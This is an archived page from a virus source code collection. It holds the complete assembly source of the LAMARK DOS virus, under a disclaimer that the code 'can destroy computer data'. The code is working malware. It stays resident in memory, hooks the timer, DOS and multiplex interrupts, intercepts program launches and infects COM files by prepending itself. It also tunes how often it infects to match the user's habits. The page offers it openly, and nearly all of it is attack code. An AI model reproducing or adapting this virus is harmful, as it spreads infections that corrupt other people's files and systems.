<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: lamark_asm</title>
<meta name="KEYWORDS" content="lamark.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for lamark.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="lamark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lamark_asm.php">lamark_asm</a><br>
<a href="lct_599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct_599_asm.php">lct_599_asm</a><br>
<a href="lct-599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct-599_asm.php">lct-599_asm</a><br>
<a href="lct_762_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct_762_asm.php">lct_762_asm</a><br>
<a href="lct-762_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct-762_asm.php">lct-762_asm</a><br>
<a href="leap-fro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leap-fro_asm.php">leap-fro_asm</a><br>
<a href="leapfrog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leapfrog_asm.php">leapfrog_asm</a><br>
<a href="leech__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leech__asm.php">leech__asm</a><br>
<a href="leech_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leech_asm.php">leech_asm</a><br>
<a href="lehi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehi_asm.php">lehi_asm</a><br>
<a href="lehigh___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh___asm.php">lehigh___asm</a><br>
<a href="lehigh__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh__asm.php">lehigh__asm</a><br>
<a href="lehigh_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh_asm.php">lehigh_asm</a><br>
<a href="lep-664a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lep-664a_asm.php">lep-664a_asm</a><br>
<a href="lepmisry_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lepmisry_asm.php">lepmisry_asm</a><br>
<a href="leprosb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosb2_asm.php">leprosb2_asm</a><br>
<a href="leprosy_2_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_2_c.php">leprosy_2_c</a><br>
<a href="leprosy_3_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_3_c.php">leprosy_3_c</a><br>
<a href="leprosy__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy__asm.php">leprosy__asm</a><br>
<a href="leprosyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosyb_asm.php">leprosyb_asm</a><br>
<a href="leprosy_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_c.php">leprosy_c</a><br>
<a href="leprosyc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosyc_asm.php">leprosyc_asm</a><br>
<a href="leprsyb1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprsyb1_asm.php">leprsyb1_asm</a><br>
<a href="leprsyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprsyb_asm.php">leprsyb_asm</a><br>
<a href="leps808d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leps808d_asm.php">leps808d_asm</a><br>
<a href="leszop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leszop_asm.php">leszop_asm</a><br>
<a href="libertyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/libertyb_asm.php">libertyb_asm</a><br>
<a href="lisa__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisa__asm.php">lisa__asm</a><br>
<a href="lisa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisa_asm.php">lisa_asm</a><br>
<a href="lisbon2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisbon2_asm.php">lisbon2_asm</a><br>
<a href="lit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lit_asm.php">lit_asm</a><br>
<a href="littl139_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/littl139_asm.php">littl139_asm</a><br>
<a href="little__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/little__asm.php">little__asm</a><br>
<a href="load_sec_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/load_sec_asm.php">load_sec_asm</a><br>
<a href="lock2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lock2_asm.php">lock2_asm</a><br>
<a href="lock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lock_asm.php">lock_asm</a><br>
<a href="lockjaw__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockjaw__asm.php">lockjaw__asm</a><br>
<a href="lockjaw_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockjaw_asm.php">lockjaw_asm</a><br>
<a href="lockout2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockout2_asm.php">lockout2_asm</a><br>
<a href="lockout_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockout_asm.php">lockout_asm</a><br>
<a href="loki1237_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki1237_asm.php">loki1237_asm</a><br>
<a href="loki_973_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki_973_asm.php">loki_973_asm</a><br>
<a href="loki-973_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki-973_asm.php">loki-973_asm</a><br>
<a href="lokjawd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lokjawd_asm.php">lokjawd_asm</a><br>
<a href="lokjawz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lokjawz_asm.php">lokjawz_asm</a><br>
<a href="lordzero_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lordzero_asm.php">lordzero_asm</a><br>
<a href="lqcancer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lqcancer_asm.php">lqcancer_asm</a><br>
<a href="ltbro299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro299_asm.php">ltbro299_asm</a><br>
<a href="ltbro307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro307_asm.php">ltbro307_asm</a><br>
<a href="ltbro321_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro321_asm.php">ltbro321_asm</a><br>
<a href="ltbrt299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbrt299_asm.php">ltbrt299_asm</a><br>
<a href="lythyum_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lythyum_asm.php">lythyum_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/g/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/g/index.php'" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;The LAMARK Virus -- To demonstrate Lamarkian evolution.


        .model  small

        .code

        ORG     100H

;Beginning of the virus code
VIRUS:
        mov     ax,0D827H               ;check for presence of the virus
        int     2FH                     ;in memory
        cmp     al,23H                  ;returns 23H if it's there
        jne     LOAD_VIRUS              ;virus not there, go load it
        jmp     LOAD_HOST               ;already there, go execute the host

        db      '(C) 1993 No One'

LOAD_VIRUS:
        mov     WORD PTR ds:[TRIGGER_OVER],0    ;set up trigger variables
        mov     ax,WORD PTR ds:[TRIGGER_SET]
        mov     WORD PTR ds:[TRIGGER],ax

        mov     ax,351CH                ;get interrupt vector 1C (timer)
        int     21H
        mov     WORD PTR ds:[OLD_1C],bx
        mov     bx,es
        mov     WORD PTR ds:[OLD_1C+2],bx       ;save old vector here

        mov     dx,OFFSET INT_1C        ;now set up new vector
        mov     ax,251CH
        int     21H

        mov     ax,352FH                ;get interrupt vector 2F (multiplex)
        int     21H
        mov     WORD PTR ds:[OLD_2F],bx
        mov     bx,es
        mov     WORD PTR ds:[OLD_2F+2],bx       ;save old vector here
        push    ds
        pop     es                      ;restore es

        mov     dx,OFFSET INT_2F        ;now set up new vector
        mov     ax,252FH
        int     21H

        mov     ax,3521H                ;get interrupt vector 21 (DOS)
        int     21H
        mov     WORD PTR ds:[OLD_21],bx
        mov     bx,es
        mov     WORD PTR ds:[OLD_21+2],bx       ;save old vector here
        push    ds
        pop     es                      ;restore es

        mov     dx,OFFSET INT_21        ;now set up new vector
        mov     ax,2521H
        int     21H

        mov     ax,ds:[TRIGGER_SET]     ;set the trigger now
        mov     ds:[TRIGGER],ax

        mov     sp,100H                 ;move stack pointer down
        mov     bx,OFFSET HOST          ;dx=size of virus + psp
        mov     cl,4
        shr     bx,cl                   ;dx=paragraphs of memory to keep
        inc     bx
        mov     ah,4AH
        int     21H                     ;decrease memory size to what's needed

        mov     bx,2CH
        mov     ax,[bx]                 ;get environment segment
        mov     ds:[EXEC],ax            ;save it here
        mov     es,ax                   ;environment in es
        mov     ax,ds
        mov     WORD PTR ds:[EXEC+2],82H
        mov     WORD PTR ds:[EXEC+4],ax         ;save pointer to command line
        mov     WORD PTR ds:[EXEC+6],5CH
        mov     WORD PTR ds:[EXEC+8],ax         ;set up FCB pointers for exec
        mov     WORD PTR ds:[EXEC+10],6CH
        mov     WORD PTR ds:[EXEC+12],ax
        mov     si,0                    ;now scan environment for this file's name
EL:     mov     ax,es:[si]              ;get a word from the environment
        or      ax,ax                   ;is it 0?
        jz      ELE                     ;yes, we're at end of environment string
        inc     si                      ;else inc pointer
        jmp     EL                      ;and continue search
ELE:    add     si,4                    ;now si points to program name string
        push    es                      ;exchange ds and es
        push    ds
        pop     es
        pop     ds
        mov     dx,si                   ;ds:dx points to file name to exec
        mov     bx,OFFSET EXEC          ;es:bx points to the EXEC data block
        mov     BYTE PTR es:[IN_INFECT],1       ;don't allow recursion here!
        mov     ax,4B00H
        int     21H                             ;EXEC the program
        mov     BYTE PTR es:[IN_INFECT],0

        mov     dx,OFFSET HOST          ;dx=size of virus + psp
        mov     cl,4
        shr     dx,cl                   ;dx=paragraphs to KEEP
        inc     dx
        mov     ax,3100H                ;terminate and stay resident
        int     21H


;This is the interrupt 1C (timer) handler for the virus. It is responsible
;for invoking the infection routine for the virus. This part of the virus
;implements Lamarkian evolution by trying to adjust TRIGGER_SET to the
;user's habits. The TRIGGER timer is initially set to TRIGGER_SET, and then
;decremented by this routine. When it is decremented to 0, the routine begins
;to increment TRIGGER_OVER. Every 32 increments, it also increments TRIGGER_SET.
;This has the effect that the trigger time will get longer if the user does
;not execute programs every TRIGGER_SET clock ticks. This is Lamarkian because
;the parent and child always have the same TRIGGER_SET at the time of
;reproduction. TRIGGER_SET does vary from generation to generation, though,
;because it varies in the parent.
INT_1C:
        push    ds
        push    cs
        pop     ds
        push    bx
        cmp     BYTE PTR ds:[IN_INFECT],1
        jz      I1CE
        cmp     WORD PTR ds:[TRIGGER],0 ;get trigger counter
        jz      I1C_05                  ;zero, don't decrement it
        dec     WORD PTR cs:[TRIGGER]   ;else decrement
        jmp     I1CE                    ;and exit
I1C_05: inc     WORD PTR ds:[TRIGGER_OVER]
        mov     bx,WORD PTR ds:[TRIGGER_OVER]
        and     bl,1FH                  ;is overflow a multiple of 32?
        jnz     I1CE                            ;nope, just exit
        cmp     WORD PTR cs:[TRIGGER_SET],0FFFFH;don't increment this too far!
        je      I1CE
        inc     WORD PTR cs:[TRIGGER_SET]       ;ok, increment TRIGGER_SET
I1CE:   pop     bx                      ;and exit our 1C handler
        pop     ds
        jmp     DWORD PTR cs:[OLD_1C]   ;pass control to old routine


;This is the interrupt 21 (DOS) handler for the virus. It traps the EXEC
;function and causes the virus to infect the file which is to be executed.
;This implements Lamarkian evolution in the other direction from INT_1C. It
;decrements TRIGGER_SET if TRIGGER_OVER is less than 32 - at least until
;TRIGGER_SET gets as small as 18 (eg one per second). This routine in
;conjunction with INT_1C allows TRIGGER_SET to increase or decrease and
;adjust to the user's habits.
INT_21:
        cmp     ax,4B00H                ;is it an EXEC call, subfunction 0?
        jne     I21E                    ;nope, just exit
        cmp     BYTE PTR cs:[IN_INFECT],1
        je      I21E                    ;no recursivity allowed
        push    bx
        mov     bx,cs:[TRIGGER]
        or      bx,bx
        jnz     I21_02
        mov     BYTE PTR cs:[IN_INFECT],1
        call    INFECT_FILE
        mov     bx,cs:[TRIGGER_SET]
        mov     cs:[TRIGGER],bx
I21_02: cmp     WORD PTR cs:[TRIGGER_OVER],32
        jge     I21_05
        cmp     WORD PTR cs:[TRIGGER_SET],18
        jle     I21_05
        dec     WORD PTR cs:[TRIGGER_SET]
I21_05: mov     WORD PTR cs:[TRIGGER_OVER],0
        mov     BYTE PTR cs:[IN_INFECT],0
I21E1:  pop     bx
I21E:   jmp     DWORD PTR cs:[OLD_21]   ;go to original handler

;This is the interrupt 2F (multiplex) handler for the virus. Its job is to tell
;the virus that it is already in memory, when the virus first starts executing.
INT_2F:
        cmp     ax,0D827H               ;identifier D827?
        jnz     I2FE                    ;no, pass control on to next in chain
        mov     al,23H                  ;yes, set al=23H
        iret                            ;and exit

I2FE:   jmp     DWORD PTR cs:[OLD_2F]   ;pass control down the chain

;This routine infects a COM file in the current directory.
INFECT_FILE:
        push    ax
        push    cx
        push    dx
        push    si
        push    di
        push    es

        mov     si,dx                   ;now see if we're looking at a COM file
IF_05:  lodsb
        or      al,al
        jz      IF_RET
        cmp     al,'.'                  ;find extent
        jne     IF_05
        lodsw
        or      ax,2020H
        cmp     al,'c'
        jne     IF_RET
        cmp     ah,'o'
        jne     IF_RET
        lodsb
        or      al,20H
        cmp     al,'m'
        jne     IF_RET                  ;if we get past this, it's a COM file

        mov     ah,48H                  ;allocate memory to read file
        mov     bx,1000H                ;--a 64K block
        int     21H
        jc      IF_RET                  ;exit if error
        mov     es,ax

        mov     ax,3D02H                ;open the file read/write
        int     21H
        jc      IF_RET                  ;exit now if error
        mov     bx,ax                   ;file handle to bx

        push    ds
        push    cs
        pop     ds
        mov     si,OFFSET VIRUS         ;move virus to memory buffer
        xor     di,di
        mov     cx,OFFSET HOST - OFFSET VIRUS
        rep     movsb

        push    es
        pop     ds
        mov     dx,di
        mov     cx,0FFFFH
        mov     ah,3FH                  ;read host into buffer
        int     21H
        jc      IF_10
        cmp     es:[di+1],0D827H        ;see if already infected
        je      IF_10                   ;yes, don't re-infect
        push    ax

        mov     ax,4200H                ;reset file pointer to start of file
        xor     cx,cx
        xor     dx,dx
        int     21H

        pop     cx
        add     cx,di
        mov     dx,0
        mov     ah,40H                  ;write infected file back to disk
        int     21H

IF_10:  pop     ds
        mov     ah,3EH                  ;close file
        int     21H
        mov     ah,49H                  ;release memory
        int     21H

IF_RET: pop     es
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     ax
        ret

;The following are all data for use by the virus

TRIGGER         DW      ?               ;dynamic timer trigger, decremented to 0 by INT_1C
TRIGGER_SET     DW      90              ;set value for trigger, modified by lamarkian means
TRIGGER_OVER    DW      0               ;trigger overflow counter
OLD_1C          DD      ?               ;old interrupt 1C vector
OLD_21          DD      ?               ;old interrutp 21 vector
OLD_2F          DD      ?               ;old interrupt 2F vector
IN_INFECT       DB      0               ;flag to indicate in infect routine
EXEC            DW      14 dup (?)      ;parameter block for EXEC function (DOS 4B)

;LOAD_HOST moves the host program down to offset 100H and executes it. This
;is accomplished by (a) putting the return address 100H on the stack, and then
;putting the instructions:
;                               rep     movsb
;                               ret
;
;just below the stack. These are executed with si, di and cx properly set up.
;Then control is transfered to these instructions via a ret instruction.
LOAD_HOST:
        mov     si,OFFSET HOST          ;prep to move host from HOST
        mov     di,0FCH                 ;to 100H
        push    di                      ;save this on stack for return
        mov     cx,sp
        sub     cx,OFFSET HOST + 100H
        mov     ax,0A4F3H               ;rep movsb instruction
        stosw
        mov     ax,00EBH                ;jmp 100H instruction to clear
        stosw                           ;386 instruction cache
        ret                             ;jump to 00FEH to do rep movsb


;The following is a dummy host to get the virus to attach to.

HOST:
        mov     dx,OFFSET LOADING - OFFSET HOST + 100H  ;display a message
        mov     ah,9
        int     21H
        mov     ax,4C00H                                ;terminate program
        int     21H

LOADING DB      'Loading LAMARK virus!$'

        END     VIRUS

</textarea></td></tr></table></body></html>
